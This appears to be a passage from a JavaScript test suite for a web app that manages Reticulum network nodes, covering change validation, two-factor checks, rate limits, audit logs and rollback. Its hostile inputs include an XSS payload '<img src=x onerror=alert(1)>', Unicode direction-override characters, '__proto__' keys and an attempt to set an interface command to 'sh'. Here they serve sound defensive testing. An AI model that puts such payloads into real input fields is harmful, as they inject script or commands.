      [change({ ...RET_CHANGE, path: ['interfaces', 'Bad]Name'] }), 400, /section that cannot be changed/],
      [change({ ...RET_CHANGE, path: ['interfaces', 'Odd\u202e'] }), 400, /section that cannot be changed/],
      [change({ ...RET_CHANGE, path: ['logging'] }), 400, /section that cannot be changed/],
      [change({ ...RET_CHANGE, key: 'type', value: 'PipeInterface' }), 400, /^type of interfaces \/ Hilltop TCP cannot be changed from the website\.$/, { path: ['interfaces', 'Hilltop TCP'] }],
      [change({ ...RET_CHANGE, key: 'interface_enabled' }), 400, /cannot be changed/],
      [change({ ...RET_CHANGE, key: 'command', value: 'sh' }), 400, /cannot be changed/],
      [change({ path: ['reticulum'], key: 'enabled', value: 'no' }), 400, /cannot be changed/],
      [change({ ...RET_CHANGE, key: 'enable_transport' }), 400, /cannot be changed/],
      [change({ ...RET_CHANGE, key: 5 }), 400, /^A setting of interfaces \/ Hilltop TCP cannot be changed/],
      [change({ ...RET_CHANGE, value: 'true' }), 400, /^enabled of interfaces \/ Hilltop TCP must be yes or no\.$/, { key: 'enabled', path: ['interfaces', 'Hilltop TCP'] }],
      [change({ ...RET_CHANGE, value: 5 }), 400, /must be yes or no/],
      [change({ ...RET_CHANGE, key: 'mode', value: 'Full' }), 400, /must be one of full, gateway, access_point, roaming, boundary/],
      [change({ ...RET_CHANGE, key: 'announce_cap', value: '0' }), 400, /percentage above 0/],
      [change({ ...RET_CHANGE, key: 'bitrate', value: '4' }), 400, /from 5 to 10000000000/],
      [change({ ...RET_CHANGE, key: 'bitrate', value: '1'.repeat(33) }), 400, /from 5 to/],
      [{ ...base, changes: [RET_CHANGE, { ...RET_CHANGE, value: 'no' }] }, 400, /is in the change twice/],
      // Turning on: refused until the node says it allows it (this node said nothing yet).
      [change({ ...RET_CHANGE, value: 'yes' }), 400, /^Turning enabled of interfaces \/ Hilltop TCP on is only possible in the terminal on this node\.$/, { code: 'enable_not_allowed', key: 'enabled' }],
      [change({ path: ['reticulum'], key: 'enable_transport', value: 'yes' }), 400, /^Turning enable_transport of reticulum on is only possible in the terminal/],
    ];
    // Refused before the step-up, so the code is never looked at (and the clock stays put).
    for (const [body, status, words, extra = {}] of bad) {
      const r = await api(s, p, { ...body, password: BOB, code: '000000' }, b);
      assert.equal(r.status, status, JSON.stringify(body).slice(0, 120));
      if (words) assert.match(r.json().error, words, JSON.stringify(body).slice(0, 120));
      for (const [k, v] of Object.entries(extra)) assert.deepEqual(r.json()[k], v, k);
    }
    assert.equal(client.calls.length, 0, 'no node was asked');
    assert.equal(jobs.started.length, 0);
    const ok = await api(s, p, { ...base, password: BOB, code: code() }, b);
    assert.equal(ok.status, 202, ok.text);
    const body = ok.json();
    assert.equal(body.id, ID);
    assert.equal(body.state, 'restarting');
    assert.equal(body.confirmSeconds, 120);
    assert.deepEqual(body.applied, [{ path: ['interfaces', 'Hilltop TCP'], key: 'enabled', from: 'yes', to: 'no' }, { path: ['reticulum'], key: 'enable_transport', from: 'no', to: 'yes' }]);
    assert.deepEqual(body.notes, ['Reticulum restarts.']);
    assert.equal(body.reticulumRevision, 'b'.repeat(32));
    assert.equal(body.confirm.id, ID);
    assert.deepEqual(client.calls, [[HOST, 'POST', '/manage/v1/reticulum', 'bob', { revision: REV, confirm_seconds: 120, changes: base.changes }]], 'exactly the node format, as the stored name');
    client.calls.length = 0;
    assert.equal(jobs.started.length, 1);
    const { sessionId, ...started } = jobs.started[0];
    assert.deepEqual(started, { host: HOST, id: ID, actor: 'bob', confirmSeconds: 120 });
    assert.equal(typeof sessionId, 'string', 'the session the change was made in');
    assert.ok(s.login.sessions.live(sessionId));
    const lines = await auditLines(s);
    assert.equal(lines.length, 1);
    assert.equal(lines[0].event, 'manage-reticulum');
    assert.deepEqual(lines[0].keys, ['interfaces/Hilltop TCP/enabled', 'reticulum/enable_transport']);
    assert.equal(lines[0].id, ID);
    assert.equal(lines[0].result, 'ok');
    assert.equal(lines[0].with, 'password+code');
    assert.doesNotMatch(JSON.stringify(lines), /"(yes|no)"/, 'no values');
    // A node that says it allows turning things on: yes goes through; one that says no again, or
    // nothing, stops it here once more.
    const turnOn = { ...base, changes: [{ ...RET_CHANGE, value: 'yes' }, { path: ['reticulum'], key: 'enable_transport', value: 'yes' }] };
    for (const [allowed, status] of [[true, 202], [false, 400], ['yes', 400], [true, 202]]) {
      client.answer = (host, method, target) => (target === '/manage/v1/state' ? { ok: true, status: 200, body: { ...STATE, reticulum_enable_allowed: allowed } } : { ok: true, status: 202, body: { id: ID } });
      assert.equal((await nodeGet(s, b)).json().reticulum_enable_allowed, allowed === true);
      const w = await api(s, p, { ...turnOn, password: BOB, code: code() }, b);
      assert.equal(w.status, status, `${allowed}: ${w.text}`);
    }
    // A node that takes it but sends no id: nothing to confirm, so no job (the node rolls back).
    client.answer = () => ({ ok: true, status: 202, body: { state: 'restarting' } });
    const noId = await api(s, p, { ...base, password: BOB, code: code() }, b);
    assert.equal(noId.status, 202);
    assert.equal(noId.json().id, null);
    assert.equal(jobs.started.length, 3);
    // The confirm window is the default without a figure for the node.
    client.confirmSeconds = () => 5;
    client.answer = () => ({ ok: true, status: 202, body: { id: ID } });
    await api(s, p, { ...base, password: BOB, code: code() }, b);
    assert.equal(client.calls.at(-1)[4].confirm_seconds, 300);
    assert.equal(jobs.started.at(-1).confirmSeconds, 300);
  } finally {
    await s.close();
  }
});

test('what a node refuses of a Reticulum change becomes a fixed sentence, with its words only for invalid_value, not_allowed and ambiguous', async () => {
  client = fakeClient();
  const jobs = fakeJobs();
  const s = await setup({ manage: { client, nodes: [HOST], confirmJobs: jobs } });
  try {
    const b = await logIn(s, 'bob', BOB);
    const code = await withTotp(s, b, BOB);
    const send = () => api(s, '/api/manage/reticulum', { host: HOST, revision: REV, changes: [RET_CHANGE], password: BOB, code: code() }, b);
    const P = ['interfaces', 'Hilltop TCP'];
    const cases = [
      [{ ok: true, status: 409, body: { error: 'pending', id: 'ffffffffffffffff', message: 'NODE WORDS' } }, 409, /^Another Reticulum change on this node is still being tested\. Wait until it is kept or rolled back\.$/, { code: 'pending', id: 'ffffffffffffffff' }],
      [{ ok: true, status: 409, body: { error: 'pending', id: '<b>' } }, 409, /still being tested/, { id: undefined }],
      [{ ok: true, status: 409, body: { error: 'not_pending', state: 'rolling_back', message: 'NODE WORDS' } }, 409, /no longer waiting/, { code: 'not_pending', state: 'rolling_back' }],
      [{ ok: true, status: 409, body: { error: 'not_pending', state: 'evil' } }, 409, /no longer waiting/, { state: null }],
      [{ ok: true, status: 409, body: { error: 'ambiguous', path: P, key: 'enabled', message: `Both enabled and interface_enabled are set\u202e ${'z'.repeat(400)}` } }, 409, /^Both enabled and interface_enabled are set z+$/, { code: 'ambiguous', path: P, key: 'enabled' }],
      [{ ok: true, status: 409, body: { error: 'ambiguous', path: 'x' } }, 409, /cannot tell for sure which line/, { path: undefined }],
      [{ ok: true, status: 404, body: { error: 'unknown_section', path: P, message: 'NODE WORDS' } }, 404, /^The node has no such section\. Reload the page\.$/, { code: 'unknown_section', path: P }],
      [{ ok: true, status: 409, body: { error: 'stale_revision', reticulum_revision: 'c'.repeat(32), settings_revision: REV, message: 'NODE WORDS' } }, 409, /^The Reticulum configuration was changed elsewhere since the page loaded it/, { code: 'stale_revision', reticulumRevision: 'c'.repeat(32), settingsRevision: undefined }],
      [{ ok: true, status: 403, body: { error: 'not_allowed', path: P, key: 'enabled', message: 'That interface runs a program.' } }, 403, /^That interface runs a program\.$/, { path: P, key: 'enabled' }],
      [{ ok: true, status: 400, body: { error: 'invalid_value', path: [P[0], '\u202e'], key: 'enabled', message: 'No.' } }, 400, /^No\.$/, { path: undefined, key: 'enabled' }],
      [{ ok: true, status: 400, body: { error: 'no_change', message: 'NODE WORDS' } }, 400, /Nothing was changed/],
      [{ ok: true, status: 409, body: { error: 'shared_instance', message: 'NODE WORDS' } }, 409, /shared Reticulum instance/],
      [{ ok: true, status: 409, body: { error: 'restarting', message: 'NODE WORDS' } }, 409, /restarting on this node already/],
      [{ ok: true, status: 409, body: { error: 'busy', message: 'NODE WORDS' } }, 409, /busy/],
      [{ ok: true, status: 429, body: { error: 'rate_limited', retry_after: 240, message: 'NODE WORDS' } }, 429, /limiting changes.*4 minutes/, { retryAfter: 240 }],
      [{ ok: true, status: 500, body: { error: 'failed', message: 'NODE WORDS' } }, 502, /^The node could not save the change, so nothing was changed\.$/, { code: 'failed' }],
    ];
    for (const [answer, status, words, extra = {}] of cases) {
      client.answer = () => answer;
      const r = await send();
      assert.equal(r.status, status, JSON.stringify(answer));
      assert.match(r.json().error, words, JSON.stringify(answer));
      for (const [k, v] of Object.entries(extra)) assert.deepEqual(r.json()[k], v, `${k} of ${JSON.stringify(answer)}`);
      assert.doesNotMatch(r.text, /NODE WORDS|\\u202e/);
    }
    assert.equal(jobs.started.length, 0, 'no job for a refusal');
    const lines = await auditLines(s);
    assert.equal(lines.length, cases.length);
    assert.ok(lines.every((l) => l.event === 'manage-reticulum' && l.id === null && l.keys[0] === 'interfaces/Hilltop TCP/enabled'));
    assert.deepEqual(lines.slice(0, 3).map((l) => l.result), ['pending', 'pending', 'not_pending']);
    // A settings change keeps its own stale words, and a restart while a change is pending says so.
    client.answer = () => ({ ok: true, status: 409, body: { error: 'stale_revision', settings_revision: REV } });
    const stale = await api(s, '/api/manage/settings', { host: HOST, revision: REV, changes: { pn_name: 'x' }, password: BOB, code: code() }, b);
    assert.match(stale.json().error, /The settings were changed elsewhere/);
    assert.equal(stale.json().settingsRevision, REV);
    client.answer = () => ({ ok: true, status: 409, body: { error: 'pending', id: ID } });
    const restart = await api(s, '/api/manage/restart', { host: HOST, password: BOB, code: code() }, b);
    assert.equal(restart.status, 409);
    assert.match(restart.json().error, /still being tested/);
  } finally {
    await s.close();
  }
});

test('the gates of a Reticulum change: the role, a recent sign in, the wait after a first factor, the budget and a session that ends meanwhile', async () => {
  client = fakeClient(() => ({ ok: true, status: 202, body: { id: ID } }));
  const waiters = [];
  let hold = false;
  const hasher = async (p) => {
    if (hold) await new Promise((r) => waiters.push(r));
    return fakeHasher(p);
  };
  const jobs = fakeJobs();
  const s = await setup({ hasher, manage: { client, nodes: [HOST], confirmJobs: jobs } });
  try {
    const p = '/api/manage/reticulum';
    const body = { host: HOST, revision: REV, changes: [RET_CHANGE] };
    const v = await logIn(s, 'victor', VIC);
    assert.equal((await api(s, p, { ...body, password: VIC }, v)).status, 403, 'a viewer');
    assert.equal((await api(s, p, body)).status, 401, 'signed out');
    assert.equal((await api(s, p, body, v, { 'Content-Type': 'application/json', 'Sec-Fetch-Site': 'cross-site', 'X-Rettui-Request': '1' })).status, 403, 'another site');
    const b = await logIn(s, 'bob', BOB);
    const code = await withTotp(s, b, BOB, { held: true });
    const held = await api(s, p, { ...body, password: BOB, code: code() }, b);
    assert.equal(held.status, 403);
    assert.equal(held.json().code, 'second-factor-new');
    s.holdClock.ahead += FIRST_FACTOR_HOLD_MS;
    // The password alone is not enough.
    assert.equal((await api(s, p, { ...body, password: BOB }, b)).json().field, 'code');
    // A role taken away while the password is checked: nothing is sent.
    hold = true;
    const pending = api(s, p, { ...body, password: BOB, code: code() }, b);
    for (let i = 0; i < 200 && waiters.length === 0; i++) await new Promise((r) => setTimeout(r, 5));
    await s.store.setRole('bob', 'viewer');
    hold = false;
    waiters.splice(0).forEach((r) => r());
    assert.equal((await pending).status, 401);
    assert.equal(client.calls.length, 0);
    assert.equal(jobs.started.length, 0);
    // A sign in older than 15 minutes: the password again first (alice, as bob's sessions ended
    // with his role).
    const a = await logIn(s, 'alice', ALICE);
    const aliceCode = await withTotp(s, a, ALICE);
    const fine = await api(s, p, { ...body, password: ALICE, code: aliceCode() }, a);
    assert.equal(fine.status, 202, fine.text);
    s.clock.t += RECENT_AUTH_MS;
    const stale = await api(s, p, { ...body, password: ALICE, code: aliceCode() }, a);
    assert.equal(stale.json().reauth, true, stale.text);
    // Each change takes one of the 30 an hour, wrong passwords included, shared with the others.
    const a2 = await logIn(s, 'alice', ALICE);
    assert.equal(a2, '', 'a second factor is on: the password alone signs nobody in');
    const v2 = await logIn(s, 'victor', VIC);
    await s.store.setRole('victor', 'manage');
    const v3 = await logIn(s, 'victor', VIC);
    assert.notEqual(v2, v3);
    const vicCode = await withTotp(s, v3, VIC);
    assert.equal((await api(s, '/api/manage/restart', { host: HOST, password: VIC, code: vicCode() }, v3)).status, 202);
    for (let used = 1; used < MANAGE_WRITES_PER_USER; used++) {
      const w = await api(s, p, { ...body, password: 'wrong one' }, v3);
      assert.ok(w.status === 400 || w.status === 429, w.text);
      assert.doesNotMatch(w.text, /too many changes/);
    }
    const over = await api(s, p, { ...body, password: VIC, code: vicCode() }, v3);
    assert.equal(over.status, 429);
    assert.match(over.json().error, /You made too many changes/);
    assert.equal(client.calls.length, 2, "alice's change and victor's restart");
  } finally {
    await s.close();
  }
});

test('the pending change, the last result and the editable sections of a node are cleaned, whatever a hostile node sends', () => {
  const P = ['interfaces', 'Hilltop TCP'];
  const sections = [{ path: ['reticulum'], keys: [] }, { path: P, keys: [{ key: 'type', value: 'TCPClientInterface', set: true }] }, { path: ['interfaces', 'Pipe'], keys: [{ key: 'type', value: 'PipeInterface', set: true }] }, { path: ['interfaces', 'Cmd'], keys: [{ key: 'location_cmd', value: null, set: true }] }, { path: ['interfaces', 'Odd\u202e'], keys: [] }];
  const ret = (editable, extra = {}) => cleanState({ ...STATE, reticulum: { revision: REV, sections, editable, ...extra } }).reticulum.editable;
  assert.deepEqual(ret([['reticulum'], P]), [['reticulum'], P]);
  const hostile = [
    ['reticulum'], ['reticulum'], P, ['interfaces', 'hilltop tcp'], ['interfaces', 'Nowhere'], ['interfaces', 'Pipe'], ['interfaces', 'Cmd'], ['interfaces', 'Odd\u202e'], ['interfaces', 'Odd'],
    ['interfaces'], ['interfaces', P[1], 'x'], ['logging'], 'reticulum', null, 5, [5], { path: P }, ['interfaces', '<img src=x onerror=alert(1)>'],
  ];
  assert.deepEqual(ret(hostile), [['reticulum'], P], 'each path once; only sections in the view, as sent, and none that runs a program');
  // At most 33 are looked at.
  assert.deepEqual(ret([...Array.from({ length: 33 }, () => ['interfaces', 'Nowhere']), ['reticulum']]), []);
  // None while shared or cut by the node, and none that is not a list.
  assert.deepEqual(ret([['reticulum']], { shared_instance: true }), []);
  assert.deepEqual(ret([['reticulum']], { truncated: true }), []);
  for (const v of [undefined, null, 'reticulum', { 0: ['reticulum'] }]) assert.deepEqual(ret(v), [], JSON.stringify(v));

  const pending = (p) => cleanState({ ...STATE, pending: p }).pending;
  const good = { id: ID, actor: 'bob', state: 'probation', applied_at: 10, confirm_seconds: 300, healthy_at: 20, confirm_by: 320, changes: [{ path: P, key: 'enabled', from: 'yes', to: 'no' }], problems: ['Hilltop TCP offline'], checks: [{ interface: 'Hilltop TCP', kind: 'self_test', result: 'passed' }] };
  assert.deepEqual(pending(good), good);
  for (const v of [null, undefined, 'x', [], {}, { ...good, id: 'nothex' }, { ...good, id: 5 }]) assert.equal(pending(v), null, JSON.stringify(v));
  const messy = pending({
    id: ID, actor: `<b>${'x'.repeat(80)}\u202e`, state: 'committed', applied_at: 'soon', confirm_seconds: -1, healthy_at: 1e12, confirm_by: 3.5,
    changes: [
      ...Array.from({ length: 20 }, () => ({ path: P, key: 'mode', from: 'full', to: 'v'.repeat(500) })),
    ],
    problems: ['ok', 7, '', 'p'.repeat(500), ...Array.from({ length: 40 }, () => 'more')],
  });
  assert.equal(messy.state, 'unknown', 'a state that is not one of the three');
  assert.equal(messy.actor.length, 32);
  assert.doesNotMatch(messy.actor, /\u202e/);
  assert.deepEqual([messy.applied_at, messy.confirm_seconds, messy.healthy_at, messy.confirm_by], [null, null, null, null]);
  assert.equal(messy.changes.length, 16);
  assert.equal(messy.changes[0].to.length, 64);
  assert.equal(messy.problems.length, 30, "32 looked at, the empty and the number dropped");
  assert.equal(messy.problems[1].length, 200);
  // A change of a key that is not shown keeps its values hidden; a malformed change is dropped.
  const masked = pending({ ...good, changes: [{ path: P, key: 'passphrase', from: 'hunter2', to: 'hunter3' }, { path: P, key: 'enabled', from: '', to: 'no' }, { path: 'x', key: 'mode', from: 'a', to: 'b' }, { path: [P[0], ''], key: 'mode', from: 'a', to: 'b' }, { path: P, key: 'Bad Key', from: 'a', to: 'b' }, 'x', { path: P, key: 'mode', from: { x: 1 }, to: true }] }).changes;
  assert.deepEqual(masked, [{ path: P, key: 'passphrase', from: '(hidden)', to: '(hidden)' }, { path: P, key: 'enabled', from: '', to: 'no' }, { path: P, key: 'mode', from: '', to: 'true' }]);
  assert.doesNotMatch(JSON.stringify(masked), /hunter/);
  for (const state of ['restarting', 'probation', 'rolling_back']) assert.equal(pending({ ...good, state }).state, state);

  const result = (r) => cleanState({ ...STATE, reticulum_result: r }).reticulum_result;
  assert.deepEqual(result({ id: ID, outcome: 'rolled_back', at: 5, message: 'no confirm by the deadline' }), { id: ID, outcome: 'rolled_back', at: 5, message: 'no confirm by the deadline' });
  for (const outcome of ['committed', 'rolled_back', 'rollback_failed', 'left']) assert.equal(result({ id: ID, outcome }).outcome, outcome);
  assert.deepEqual(result({ id: ID, outcome: '<script>', at: 'x', message: `m\u0000${'m'.repeat(400)}` }), { id: ID, outcome: 'unknown', at: null, message: 'm'.repeat(300) });
  for (const v of [null, 'x', [], { outcome: 'committed' }, { id: 'zz', outcome: 'committed' }]) assert.equal(result(v), null, JSON.stringify(v));
  // The audit list shows the section of a Reticulum change, and the old shape of a settings one.
  const entries = cleanAudit({ entries: [{ seq: 1, time: 1, id: ID, actor: 'bob', op: 'reticulum', changes: [{ path: P, key: 'enabled', from: 'yes', to: 'no' }, { path: [], key: 'pn_name', from: 'a', to: 'b' }], result: 'ok', error: null }, { seq: 2, time: 2, id: ID, actor: 'bob', op: 'auto_rollback', changes: [], result: 'rolled_back', error: 'no confirm by the deadline' }] }).entries;
  assert.deepEqual(entries[0].changes, [{ path: P, key: 'enabled', from: 'yes', to: 'no' }, { key: 'pn_name', from: 'a', to: 'b' }]);
  assert.deepEqual([entries[1].op, entries[1].result], ['auto_rollback', 'rolled_back']);
});

test('GET /api/manage/confirm says how the confirm job goes, never asks the node, and is limited per user', async () => {
  client = fakeClient();
  const jobs = fakeJobs();
  const s = await setup({ manage: { client, nodes: [HOST], confirmJobs: jobs } });
  try {
    const q = `/api/manage/confirm?host=${encodeURIComponent(HOST)}`;
    assert.equal((await get(s, q)).status, 401);
    const v = await logIn(s, 'victor', VIC);
    assert.equal((await get(s, q, v)).status, 403);
    const b = await logIn(s, 'bob', BOB);
    assert.deepEqual((await get(s, q, b)).json(), { host: HOST, job: null });
    assert.equal((await get(s, '/api/manage/confirm?host=c.test%3A3', b)).status, 404);
    assert.equal((await get(s, '/api/manage/confirm', b)).status, 404);
    jobs.start({ host: HOST, id: ID, actor: 'alice' });
    const r = await get(s, q, b);
    assert.equal(r.status, 200);
    assert.equal(r.headers['cache-control'], 'private, no-store');
    assert.deepEqual(r.json().job, jobs.status(HOST));
    assert.equal((await get(s, '/api/manage/confirm?host=A.TEST%3A1', b)).json().job.id, ID, 'the host is matched without regard to case');
    assert.deepEqual((await get(s, q, b, 'HEAD')).text, '');
    // The node state shows the job and the confirm window too.
    const state = (await nodeGet(s, b)).json();
    assert.deepEqual(state.confirm, jobs.status(HOST));
    assert.equal(state.confirmSeconds, 300);
    assert.equal(state.pending, null);
    assert.equal(state.reticulum_result, null);
    assert.equal(client.calls.length, 1, 'only the node state asked the node');
    // 1200 an hour per user, apart from the reads of the node.
    for (let i = 0; i < MANAGE_CONFIRM_READS_PER_USER - 4; i++) await get(s, q, b);
    assert.equal((await get(s, q, b)).status, 200, 'the 1200th');
    const over = await get(s, q, b);
    assert.equal(over.status, 429);
    assert.ok(Number(over.headers['retry-after']) > 0);
    assert.equal((await nodeGet(s, b)).status, 200);
    const a = await logIn(s, 'alice', ALICE);
    assert.equal((await get(s, q, a)).status, 200);
  } finally {
    await s.close();
  }
  // Without a confirm job (no nodes), the answer is null.
  const none = await setup({ manage: null });
  try {
    const c = await logIn(none, 'bob', BOB);
    assert.equal((await get(none, `/api/manage/confirm?host=${HOST}`, c)).status, 404);
  } finally {
    await none.close();
  }
});

test('end to end with the stub node: a Reticulum change goes on probation and the confirm job keeps it, or the node rolls back', async () => {
  const { createConfirmJobs } = await import('../lib/manage-confirm.js');
  const { editableReticulum } = await import('./helpers/manage-node.js');
  const node = await startManageNode({ secret: SECRET });
  node.reticulum = editableReticulum();
  const real = createManageClient({ nodes: new Map([[HOST, { url: node.url, secret: SECRET, confirmSeconds: 90 }]]) });
  // The real jobs, on fake timers; the store and audit log are the app's, made in setup.
  const timers = [];
  const probes = [];
  let up = true;
  let made = null;
  const jobs = { start: (x) => made.start(x), status: (h) => made.status(h), stopAll: () => made?.stopAll() };
  const s = await setup({ manage: { client: real, nodes: [HOST], confirmJobs: jobs } });
  made = createConfirmJobs({ client: real, probeFn: async (h, p) => (probes.push([h, p]), { up }), targetOf: () => ({ host: 'a.test', port: 1 }), store: s.store, epochOf: s.login.epochOf, sessionLive: (id) => s.login.sessions.live(id), audit: s.audit, setTimer: (f) => (timers.push(f), timers.length), clearTimer: () => {} });
  const tick = async () => timers.shift()();
  try {
    const b = await logIn(s, 'bob', BOB);
    const code = await withTotp(s, b, BOB);
    const state = (await nodeGet(s, b)).json();
    assert.deepEqual(state.reticulum.editable, [['reticulum'], ['interfaces', 'Hilltop TCP']], 'the pipe is not editable');
    assert.equal(state.confirmSeconds, 90);
    const apply = (revision, changes = [RET_CHANGE]) => api(s, '/api/manage/reticulum', { host: HOST, revision, changes, password: BOB, code: code() }, b);
    const r = await apply(state.reticulum.revision);
    assert.equal(r.status, 202, r.text);
    assert.deepEqual(r.json().applied, [{ path: ['interfaces', 'Hilltop TCP'], key: 'enabled', from: 'Yes', to: 'no' }]);
    assert.equal(node.pending.state, 'restarting');
    assert.equal(node.pending.confirm_seconds, 90);
    assert.equal(node.requests.at(-1).actor, 'bob');
    // The stub edits the alias it found, as the node does.
    assert.deepEqual(node.reticulum.sections[1].keys[1], { key: 'interface_enabled', value: 'no', set: true });
    const seen = (await nodeGet(s, b)).json();
    assert.equal(seen.pending.state, 'restarting');
    assert.deepEqual(seen.pending.changes, [{ path: ['interfaces', 'Hilltop TCP'], key: 'enabled', from: 'Yes', to: 'no' }]);
    assert.equal(seen.confirm.state, 'waiting');
    // A second change while one is pending, and the old revision: refused.
    const second = await apply(r.json().reticulumRevision);
    assert.equal(second.json().code, 'pending');
    await tick();
    assert.equal(probes.length, 0, 'not probed while restarting');
    node.advance('probation');
    // The node's own checks: shown cleaned in /state, and in its audit notes once it is kept.
    node.pending.checks = [{ interface: 'Hilltop TCP', kind: 'self_test', result: 'passed' }, { interface: 'Hilltop TCP\u2028', kind: 'online', result: 'traffic' }, { interface: 'Evil', kind: 'self_test', result: '<b>' }];
    assert.deepEqual((await nodeGet(s, b)).json().pending.checks, [{ interface: 'Hilltop TCP', kind: 'self_test', result: 'passed' }, { interface: 'Hilltop TCP', kind: 'online', result: 'traffic' }]);
    await tick();
    assert.deepEqual(probes, [['a.test', 1]]);
    assert.equal(node.pending, null);
    assert.equal(node.reticulumResult.outcome, 'committed');
    assert.equal(made.status(HOST).outcome, 'committed');
    const confirm = node.requests.filter((x) => x.path === '/manage/v1/confirm');
    assert.equal(confirm.length, 1);
    assert.equal(confirm[0].actor, 'bob', 'confirmed as the user who made the change');
    assert.equal(confirm[0].signed, true);
    assert.deepEqual(JSON.parse(confirm[0].body), { id: r.json().id });
    // Stale now; then a change whose probe never works is left to the node, which rolls back.
    assert.equal((await apply(state.reticulum.revision)).json().code, 'stale_revision');
    // Turning transport on needs the node's yes, which it now gives.
    node.reticulumEnableAllowed = true;
    const fresh = (await nodeGet(s, b)).json();
    assert.equal(fresh.reticulum_result.outcome, 'committed');
    assert.equal(fresh.reticulum_enable_allowed, true);
    up = false;
    const r2 = await apply(fresh.reticulum.revision, [{ path: ['reticulum'], key: 'enable_transport', value: 'yes' }]);
    assert.equal(r2.status, 202, r2.text);
    node.advance('probation');
    await tick();
    await tick();
    assert.equal(node.pending.state, 'probation', 'never confirmed');
    node.finish('rolled_back', 'no confirm by the deadline');
    await tick();
    assert.equal(made.status(HOST).outcome, 'rolled_back');
    assert.equal(made.status(HOST).message, 'The node put the old config back: no confirm by the deadline');
    assert.equal(node.reticulum.sections[0].keys[0].value, 'no', 'the stub put the old value back');
    assert.equal(node.requests.filter((x) => x.path === '/manage/v1/confirm').length, 1);
    const lines = await auditLines(s);
    assert.deepEqual(lines.map((l) => [l.event, l.result]), [['manage-reticulum', 'ok'], ['manage-reticulum', 'pending'], ['manage-confirm', 'ok'], ['manage-reticulum', 'stale_revision'], ['manage-reticulum', 'ok'], ['manage-confirm', 'not_pending']]);
    assert.equal(lines[5].outcome, 'rolled_back');
    const list = (await get(s, `/api/manage/audit?host=${HOST}`, b)).json();
    assert.deepEqual(list.entries.map((e) => e.op), ['auto_rollback', 'reticulum', 'confirm', 'reticulum']);
    assert.deepEqual(list.entries[3].changes, [{ path: ['interfaces', 'Hilltop TCP'], key: 'enabled', from: 'Yes', to: 'no' }]);
    assert.deepEqual(list.entries[2].notes, ['Checks: Hilltop TCP self_test passed; Hilltop TCP online traffic; Evil self_test <b>']);
    assert.ok(s.texts.every((t) => !t.includes(SECRET)));
  } finally {
    await s.close();
    await node.close();
  }
});

test('the app makes the confirm jobs itself: a change taken by the node shows a waiting job until the server stops', async () => {
  client = fakeClient((host, method, target) => (target === '/manage/v1/reticulum' ? { ok: true, status: 202, body: { id: ID } } : { ok: true, status: 200, body: STATE }));
  const s = await setup();
  try {
    const b = await logIn(s, 'bob', BOB);
    const code = await withTotp(s, b, BOB);
    assert.equal((await api(s, '/api/manage/reticulum', { host: HOST, revision: REV, changes: [RET_CHANGE], password: BOB, code: code() }, b)).status, 202);
    const job = (await get(s, `/api/manage/confirm?host=${HOST}`, b)).json().job;
    assert.equal(job.id, ID);
    assert.equal(job.state, 'waiting');
  } finally {
    // Closing the server stops the job: nothing is left to run after the test.
    await s.close();
  }
});

test("the node's checks of a pending change and the notes of its audit entries are cleaned, whatever a hostile node sends", () => {
  const checks = (c) => cleanState({ ...STATE, pending: { id: ID, state: 'probation', checks: c } }).pending.checks;
  const good = [
    { interface: 'Hilltop TCP', kind: 'self_test', result: 'waiting' },
    { interface: 'Hilltop TCP', kind: 'self_test', result: 'passed' },
    { interface: 'Hilltop TCP', kind: 'self_test', result: 'failed' },
    { interface: 'Radio', kind: 'online', result: 'traffic' },
    { interface: 'Radio', kind: 'online', result: 'no_traffic' },
    { interface: 'Radio', kind: 'online', result: 'waiting' },
  ];
  assert.deepEqual(checks(good), good);
  const hostile = checks([
    null, 'x', 5, [],
    { interface: 'A', kind: 'ping', result: 'passed' },
    { interface: 'A', kind: 'self_test', result: 'traffic' }, // a result of the other kind
    { interface: 'A', kind: 'online', result: 'passed' },
    { interface: 'A', kind: 'self_test', result: 'PASSED' },
    { interface: 'A', kind: '__proto__', result: 'passed' },
    { interface: 'A', kind: 'toString', result: 'passed' },
    { interface: 5, kind: 'self_test', result: 'passed' },
    { interface: '\u202e\u0000\u2028', kind: 'self_test', result: 'passed' },
    { kind: 'online', result: 'traffic' },
    { interface: `<img src=x onerror=alert(1)>\u202e\u2028${'é'.repeat(40)}`, kind: 'online', result: 'traffic', extra: 'dropped' },
  ]);
  assert.equal(hostile.length, 1);
  assert.equal(hostile[0].kind, 'online');
  assert.ok(hostile[0].interface.startsWith('<img src=x onerror=alert(1)>é'), 'markup stays text; the page sets it as text');
  assert.ok(Buffer.byteLength(hostile[0].interface) <= 64);
  assert.doesNotMatch(hostile[0].interface, new RegExp('[\\u202e\\u2028]'));
  assert.deepEqual(Object.keys(hostile[0]), ['interface', 'kind', 'result']);
  // At most 32 are looked at; none, or not a list, is an empty list.
  assert.equal(checks(Array.from({ length: 40 }, (_, i) => ({ interface: `I${i}`, kind: 'online', result: 'traffic' }))).length, 32);
  assert.deepEqual(checks([...Array.from({ length: 32 }, () => null), good[0]]), []);
  for (const v of [undefined, null, 'x', { 0: good[0] }]) assert.deepEqual(checks(v), [], JSON.stringify(v));
  // Notes of an audit entry: one text or a list, cleaned, cut at 300, at most 16.
  const notes = (n) => cleanAudit({ entries: [{ seq: 1, time: 1, op: 'confirm', result: 'ok', notes: n }] }).entries[0].notes;
  assert.deepEqual(notes('Checks: Hilltop TCP self_test passed; Radio online traffic'), ['Checks: Hilltop TCP self_test passed; Radio online traffic']);
  assert.deepEqual(notes(['Checks with the change: Radio online no_traffic', 'Checks after the rollback: Radio online traffic']), ['Checks with the change: Radio online no_traffic', 'Checks after the rollback: Radio online traffic']);
  assert.deepEqual(notes(['a\u2028b\u202e', 7, '', null, 'n'.repeat(500)]), ['ab', 'n'.repeat(300)]);
  assert.equal(notes(Array.from({ length: 40 }, () => 'x')).length, 16);
  for (const v of [undefined, null, 5, { a: 1 }]) assert.deepEqual(notes(v), [], JSON.stringify(v));
});
